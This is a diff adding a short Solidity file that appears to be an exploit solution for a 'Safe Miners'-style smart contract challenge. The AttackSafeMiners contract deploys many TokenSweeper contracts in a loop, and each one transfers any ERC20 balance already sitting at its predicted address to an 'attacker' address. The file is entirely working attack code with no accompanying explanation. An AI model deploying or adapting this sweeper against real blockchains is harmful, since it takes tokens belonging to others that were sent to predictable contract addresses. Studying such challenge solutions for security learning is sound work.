@@ -1,0 +1,40 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IERC20Minimal {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+contract AttackSafeMiners {
+    constructor(
+        address attacker,
+        IERC20Minimal token,
+        uint256 nonces
+    ) {
+        for (uint256 idx; idx < nonces; idx++) {
+            new TokenSweeper(attacker, token);
+        }
+    }
+}
+
+contract TokenSweeper {
+    constructor(
+        address attacker,
+        IERC20Minimal token
+    ) {
+        uint256 balance = token.balanceOf(address(this));
+        if (balance > 0) {
+            token.transfer(attacker, balance);
+        }
+    }
+}
